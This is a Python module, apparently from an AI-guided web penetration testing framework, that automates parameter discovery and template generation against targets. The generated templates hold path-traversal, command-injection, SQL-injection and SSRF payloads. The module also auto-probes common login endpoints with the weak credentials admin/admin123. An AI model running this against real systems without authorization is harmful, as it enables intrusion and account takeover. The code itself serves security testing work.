#!/usr/bin/env python3
"""ai_guided playbook: AI 规划 + fastsec 确定性执行 闭环。

阶段:
  1. fastsec -diff 发现候选参数（行为差异 → IDOR/越权信号）
  2. fastsec -top 参数分级（名称权重 + 差异度 → Top N）
  3. 模板生成器把 top 参数固化为针对性模板
  4. fastsec 模板模式深挖（3-gate 零误报确认）
  5. 有登录态时 fastsec -seq 状态化验证

AI 角色在步骤 2→3 之间（读 priority，决定哪些参数值得固化为模板），
其余全部确定性执行。
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

from kali_mcp.core.action_log import log_action
from kali_mcp.core.evidence_store import save_evidence

# fastsec 二进制路径（Kali 后端）
FASTSEC_BIN = os.environ.get("FASTSEC_BIN", "fastsec")

# 默认参数候选池（行为差异检测的起点）
DEFAULT_PARAMS = "id,user,userId,user_id,uid,account,order,orderId,email,mobile,file,path,page,category,search,q,url,callback,next,redirect,return"


def _run(cmd: List[str], timeout: int = 300) -> Dict[str, Any]:
    """Run a local/remote command; prefer ssh backend when available."""
    import shlex
    # 含空格的参数加引号（如 -H "X-Token: abc"），避免 shell 拆分
    quoted = " ".join(shlex.quote(c) if (" " in c or '"' in c) else c for c in cmd)
    try:
        from kali_mcp.core.backend import ssh_execute
        r = ssh_execute(quoted, timeout=timeout)
        if r.get("return_code", -1) != -1:
            return r
    except Exception:
        pass
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"success": p.returncode == 0, "output": p.stdout, "error": p.stderr, "return_code": p.returncode}
    except subprocess.TimeoutExpired:
        return {"success": False, "error": f"timeout {timeout}s", "return_code": -1}


def run_ai_guided(executor, target: str, depth: str = "standard", **kwargs) -> Dict[str, Any]:
    """AI-guided pentest loop: diff → prioritize → template → deep scan.

    Args:
        target: target URL (e.g. http://host/api/orders) 或 targets 列表
        depth: quick | standard | thorough
        kwargs:
            params: override param candidate list
            headers: auth headers (k:v;k:v)
            seq_file: optional login sequence YAML
            targets: 多目标列表（并发独立闭环）
            task_id: findings 入库用的任务 ID（缺省用 target 派生）
    """
    params = kwargs.get("params") or DEFAULT_PARAMS
    headers = kwargs.get("headers", "")
    seq_file = kwargs.get("seq_file", "")
    task_id = kwargs.get("task_id") or ""

    # 多目标并发：targets 列表 → 每目标独立闭环（ThreadPoolExecutor ≤5）
    multi = kwargs.get("targets") or []
    if multi:
        import concurrent.futures as _cf
        targets_to_run = list(multi)[:5]  # 并发上限 5
        # 子调用去掉 targets（否则无限递归）
        sub_kwargs = {k: v for k, v in kwargs.items() if k != "targets"}
        outs = []
        with _cf.ThreadPoolExecutor(max_workers=min(len(targets_to_run), 5)) as _ex:
            futs = {_ex.submit(run_ai_guided, executor, t, depth, **sub_kwargs): t for t in targets_to_run}
            for _f in _cf.as_completed(futs):
                try:
                    outs.append(_f.result())
                except Exception as _e:
                    outs.append({"phases": [{"stage": "error", "ok": False, "detail": str(_e)[:200]}], "findings": []})
        # 汇总多目标结果
        merged = {
            "phases": [{"stage": "multi_target", "ok": True,
                        "detail": f"{len(outs)} 目标并行完成, 共 {sum(len(o.get('findings', [])) for o in outs)} findings"}],
            "findings": [f for o in outs for f in o.get("findings", [])],
            "stages_ok": sum(o.get("stages_ok", 0) for o in outs),
            "stages_total": sum(o.get("stages_total", 0) for o in outs),
        }
        return merged
    stages: List[Dict[str, Any]] = []
    findings: List[Dict[str, Any]] = []
    tmpdir = Path(tempfile.mkdtemp(prefix="ai_guided_"))

    def _stage(name: str, ok: bool, detail: str) -> None:
        entry = {"phase": "ai_guided", "stage": name, "ok": ok, "detail": detail[:400]}
        stages.append(entry)
        log_action(str(target), phase="ai_guided", target=str(target), tool=name, args={"detail": detail[:200]})

    try:
        # Stage 1: behavioral diff（-json /dev/stdout 拿 JSON，避免 ssh/本地路径错位）
        cmd = [FASTSEC_BIN, "-u", str(target), "-diff", params,
               "-delay-min", "100", "-delay-max", "300", "-c", "20",
               "-json", "/dev/stdout"]
        if headers:
            cmd += ["-H", headers]
        r = _run(cmd)
        # 从 stdout 提取 JSON（fastsec -json /dev/stdout 会把 JSON 打到 stdout）
        diff_data = {}
        out_text = (r.get("output") or "") + (r.get("error") or "")
        # 找 JSON 起点（{ 开头到结尾）
        try:
            start = out_text.find("{")
            if start >= 0:
                # 尝试解析从第一个 { 开始的最长合法 JSON
                import json as _json
                for end in range(len(out_text), start, -1):
                    try:
                        diff_data = _json.loads(out_text[start:end])
                        break
                    except Exception:
                        continue
        except Exception:
            pass
        n_findings = len(diff_data.get("findings", []))
        _stage("diff", n_findings > 0,
               f"发现 {n_findings} 个行为差异候选参数")
        if n_findings == 0:
            _stage("prioritize", True, "无候选参数（目标未暴露差异）")
            return _summary(stages, findings, tmpdir, task_id=task_id)

        # Stage 2: priority inside diff_data; surface top-N for AI decision
        prio = diff_data.get("priority", [])
        top_params = [p.get("param") for p in prio[:3]]  # AI 决策点：取 top3
        _stage("prioritize", True, f"Top 参数: {top_params}")

        # Stage 2.5: 知识库注入——按参数类型查渗透经验，打开 AI 攻击思路
        kb_hints = []
        kb_context = {}  # param → 知识库摘要
        for p in top_params:
            pl = str(p).lower()
            kb_query = None
            if any(k in pl for k in ("id", "uid", "user", "account", "profile")):
                kb_query = "越权"
            elif any(k in pl for k in ("file", "path", "download", "read")):
                kb_query = "文件读取"
            elif any(k in pl for k in ("cmd", "exec", "shell", "ping", "host")):
                kb_query = "命令执行"
            elif any(k in pl for k in ("search", "q", "query", "keyword")):
                kb_query = "SQL注入"
            elif any(k in pl for k in ("url", "link", "redirect", "next")):
                kb_query = "SSRF"
            if kb_query:
                kb_r = _run([FASTSEC_BIN, "-kb", kb_query])
                kb_out = (kb_r.get("output") or "")[:500]
                kb_context[p] = {"query": kb_query, "hint": kb_out[:200]}
                kb_hints.append(f"{p}→{kb_query}")
        if kb_hints:
            _stage("knowledge", True, f"知识库注入: {kb_hints}")

        # Stage 3-4: 生成针对性模板（纯 python 生成 YAML）+ 经 ssh 写 Kali 临时目录 + fastsec 深挖
        if top_params:
            # 找每个 top 参数的发现 URL（去 query，取路径）
            from urllib.parse import urlparse
            url_map = {}
            for f in diff_data.get("findings", []):
                url_map[f.get("param")] = f.get("url", str(target))
            yaml_files = []
            for i, pname in enumerate(top_params[:3]):
                f_url = url_map.get(pname, str(target))
                base_path = urlparse(f_url.split("?")[0]).path or "/"
                sev = next((pp.get("severity", "medium") for pp in prio if pp.get("param") == pname), "medium")
                # 知识库驱动的 payload 选择：按注入类型用攻击值
                ctx = kb_context.get(pname, {})
                kb_query = ctx.get("query", "")
                if kb_query == "文件读取":
                    values = ("../../../../etc/passwd", "..%2f..%2fetc%2fpasswd", "/etc/passwd", "....//....//etc/passwd")
                elif kb_query == "命令执行":
                    values = (";id", "|id", "$(id)", "`id`")
                elif kb_query == "SQL注入":
                    values = ("'", "1' OR '1'='1", "1 UNION SELECT 1,2-- -", "1 AND 1=1")
                elif kb_query == "越权":
                    values = ("2", "0", "-1", "999999")
                elif kb_query == "SSRF":
                    values = ("http://127.0.0.1", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd", "http://0.0.0.0")
                else:
                    values = ("2", "0", "-1", "999999")
                paths = "\n".join(
                    f'      - "{{{{BaseURL}}}}{base_path}?{pname}={v}"'
                    for v in values
                )
                tpl = (
                    f"id: diff-{pname}\n\n"
                    f"info:\n  name: Behavioral diff probe for {pname}\n"
                    f"  author: community\n  severity: {sev}\n\n"
                    f"http:\n  - method: GET\n    path:\n{paths}\n"
                    f"    matchers:\n      - type: status\n        status:\n          - 200\n          - 403\n"
                )
                yaml_files.append((pname, tpl))
            # 经 ssh 写入 Kali 临时目录
            gen_remote = "/tmp/ai_guided_tpl"
            try:
                from kali_mcp.core.backend import ssh_execute
                ssh_execute(f"mkdir -p {gen_remote} && rm -f {gen_remote}/*.yaml", timeout=30)
                for pname, tpl in yaml_files:
                    # base64 传输避免转义
                    import base64
                    b64 = base64.b64encode(tpl.encode()).decode()
                    ssh_execute(f"echo {b64} | base64 -d > {gen_remote}/diff-{pname}.yaml", timeout=30)
                gen_count = len(yaml_files)
                _stage("generate_templates", gen_count > 0, f"生成 {gen_count} 个针对性模板到 Kali")
                # Stage 4: deep scan（-json /dev/stdout）
                # deep scan 用根 URL：生成的模板 path 是绝对路径（/profile?...），
                # -u 传根避免路径叠加（{{BaseURL}} + /profile = http://host/profile）
                from urllib.parse import urlparse as _up
                _p = _up(str(target))
                root_url = f"{_p.scheme}://{_p.netloc}/"
                deep_cmd = [FASTSEC_BIN, "-u", root_url, "-d", gen_remote,
                            "-delay-min", "100", "-delay-max", "300", "-c", "20",
                            "-json", "/dev/stdout"]
                if headers:
                    deep_cmd += ["-H", headers]
                dr = _run(deep_cmd)
                deep_findings = []
                dout = (dr.get("output") or "") + (dr.get("error") or "")
                try:
                    ds = dout.find("[")
                    if ds >= 0:
                        import json as _json
                        for dend in range(len(dout), ds, -1):
                            try:
                                deep_findings = _json.loads(dout[ds:dend])
                                break
                            except Exception:
                                continue
                except Exception:
                    pass
                for f in deep_findings:
                    findings.append({
                        "title": f"行为差异确认 {f.get('url')}",
                        "severity": f.get("severity", "medium"),
                        "description": f"template={f.get('template')} verified={f.get('verified')}",
                        "phase": "ai_guided",
                    })
                _stage("deep_scan", True, f"深挖完成，确认 {len(deep_findings)} 个")
            except Exception as e:
                _stage("generate_templates", False, f"模板生成失败: {e}")

        # Stage 5: 自动登录探测 + 状态化序列验证（有登录面时自动触发）
        # 自动生成登录序列：探测常见登录端点 → 尝试弱凭据 → 提取 token → 验证
        auto_seq = _auto_login_seq(str(target), headers)
        if auto_seq:
            # 序列 YAML 经 base64 写入 Kali
            seq_remote = "/tmp/ai_guided_seq.yaml"
            try:
                import base64 as _b64
                seq_b64 = _b64.b64encode(auto_seq.encode()).decode()
                from kali_mcp.core.backend import ssh_execute
                ssh_execute(f"echo {seq_b64} | base64 -d > {seq_remote}", timeout=30)
                # seq 用 root URL（序列文件自带 base_url + 相对 path）
                from urllib.parse import urlparse as _up2
                _p2 = _up2(str(target))
                _root = f"{_p2.scheme}://{_p2.netloc}/"
                seq_cmd = [FASTSEC_BIN, "-u", _root, "-seq", seq_remote,
                           "-delay-min", "100", "-delay-max", "300", "-json", "/dev/stdout"]
                sr = _run(seq_cmd)
                seq_data = []
                sout = (sr.get("output") or "") + (sr.get("error") or "")
                try:
                    ss = sout.find("[")
                    if ss >= 0:
                        import json as _json
                        for send_ in range(len(sout), ss, -1):
                            try:
                                seq_data = _json.loads(sout[ss:send_])
                                break
                            except Exception:
                                continue
                except Exception:
                    pass
                for step in seq_data:
                    if step.get("diff"):
                        findings.append({
                            "title": f"登录态越权确认 {step.get('url')}",
                            "severity": "high",
                            "description": f"step={step.get('step')} diff={step.get('diff')}",
                            "phase": "ai_guided",
                        })
                _stage("seq_validate", True, f"登录态序列执行 {len(seq_data)} 步，确认 {sum(1 for s_ in seq_data if s_.get('diff'))} 个越权")
            except Exception as e:
                _stage("seq_validate", False, f"状态化验证失败: {e}")
        else:
            _stage("seq_validate", True, "未发现登录面，跳过状态化验证")

    except Exception as e:
        _stage("error", False, str(e))

    return _summary(stages, findings, tmpdir, task_id=task_id)


def _auto_login_seq(target: str, headers: str = "") -> str:
    """自动生成登录态序列 YAML：探测常见登录端点，弱凭据尝试，提取 token。

    返回 YAML 字符串；未发现登录面返回 ""。
    仅对授权目标生效（调用方负责授权）。
    """
    from urllib.parse import urlparse
    try:
        p = urlparse(target)
        root = f"{p.scheme}://{p.netloc}/"
    except Exception:
        return ""

    # 常见登录端点探测
    login_paths = ["/login", "/api/login", "/api/auth/login", "/signin", "/user/login", "/admin/login"]
    found = None
    try:
        from kali_mcp.core.backend import ssh_execute
        for lp in login_paths:
            # curl 探测（跟随重定向，看是否有登录表单/接口）
            r = ssh_execute(f"curl -s -o /dev/null -w '%{{http_code}}' -m 5 {root.strip('/')}{lp}", timeout=15)
            if r.get("output", "").strip() in ("200", "201", "302", "301"):
                found = lp
                break
    except Exception:
        return ""

    if not found:
        return ""

    # 生成登录序列：POST 弱凭据 → 提取 token/cookie → 访问根路径验证会话
    # must_contain 检查响应 body 关键词（登录成功标志），非状态码
    # 用单引号包裹正则避免 YAML 转义（Go yaml 双引号内 \ 会二次转义）
    seq = rf"""base_url: {root}
steps:
  - name: 登录获取会话
    method: POST
    path: {found}
    body: "username=admin&password=admin123"
    extract:
      token: '"(?:token|access_token|sessionId|sid|session)"\s*:\s*"([^"]+)"'
      cookie: '([A-Za-z_]+=[A-Za-z0-9_.-]+)'
    must_contain:
      - "token"
      - "session"
  - name: 会话有效性验证
    method: GET
    path: /
    headers:
      X-Token: "{{{{token}}}}"
      Cookie: "{{{{cookie}}}}"
"""
    return seq


def _summary(stages: List[Dict[str, Any]], findings: List[Dict[str, Any]], tmpdir: Path,
           task_id: str = "") -> Dict[str, Any]:
    summary = {
        "phases": stages,
        "findings": findings,
        "stages_ok": sum(1 for s in stages if s["ok"]),
        "stages_total": len(stages),
        "workspace": str(tmpdir),
    }
    try:
        save_evidence("ai_guided", summary)
    except Exception:
        pass
    # findings 入库（candidate → 可后续 verify 提级）
    if findings and task_id:
        try:
            from kali_mcp.core.verifier import register_candidate
            for f in findings:
                register_candidate(
                    task_id,
                    title=f.get("title", "ai_guided finding"),
                    target=f.get("description", ""),
                    severity=f.get("severity", "medium"),
                    source="ai_guided",
                    technique_ids=["T1190", "T1210"],
                    meta={"phase": "ai_guided", "detail": f.get("description", "")},
                )
        except Exception:
            pass
    return summary
